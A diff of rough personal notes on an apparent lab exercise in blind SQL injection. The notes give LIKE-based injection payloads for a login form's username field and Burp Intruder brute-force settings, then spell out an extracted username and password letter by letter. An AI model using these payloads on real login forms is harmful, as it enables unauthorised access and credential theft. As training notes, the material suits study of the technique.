@@ -26,7 +26,7 @@ username=' or username LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=p
 and option payload set: 1
 optin payload type brute-force
 13. later remplace letter with greater that length
-14. I find the first letter named fletche how one letter
+14. I find the first word named fletcher how one letter
 have: f position 1 and request 7 length 598
 	: l position 2 and request 50 length 598
 	: e position 3 and request 80 length 598
@@ -39,3 +39,12 @@ have: f position 1 and request 7 length 598
 command: 
 username=' or password LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
 this capture and edit package http in file test_4.txt
+16. I find letters in password:
+we have: b position 1 and request 3 length 598
+	   : r position 2 and request 56 length 598
+	   : i position 3 and request 84 length 598
+	   : t position 4 and request 132 length 598
+	   : t position 5 and request 169 length 598
+	   : n position 6 and request 200 length 598
+	   : e position 7 and request 228 length 598 
+	   : y position 8 and request 300 length 598	 
